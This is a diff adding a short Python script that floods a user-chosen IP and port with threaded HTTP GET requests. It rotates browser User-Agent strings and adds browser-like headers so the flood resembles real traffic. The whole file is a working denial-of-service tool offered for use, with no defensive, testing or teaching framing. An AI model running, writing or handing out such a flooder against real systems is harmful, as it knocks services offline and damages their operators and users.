@@ -1,0 +1,50 @@
+import socket
+import threading
+import time
+import random
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
+   
+]
+
+CUSTOM_HEADERS = {
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Connection': 'keep-alive',
+    
+}
+
+def send_request(target_ip, target_port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, target_port))
+        user_agent = random.choice(USER_AGENTS)
+        request_headers = f"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: {user_agent}\r\n"
+        for header, value in CUSTOM_HEADERS.items():
+            request_headers += f"{header}: {value}\r\n"
+        request_headers += "\r\n"
+        s.sendall(request_headers.encode())
+        s.close()
+        print("\033[92mSuccessfully sent\033[92m", flush=True)  
+        time.sleep(0.001)  
+    except Exception as e:
+        print(f"Failed to send request: {e}")
+
+if __name__ == "__main__":
+    target_ip = input("Enter the target IP address: ")
+    target_port = int(input("Enter the target port: "))
+    num_requests = int(input("Enter the number of requests to send: "))
+
+    threads = []
+    for _ in range(num_requests):
+        t = threading.Thread(target=send_request, args=(target_ip, target_port))
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
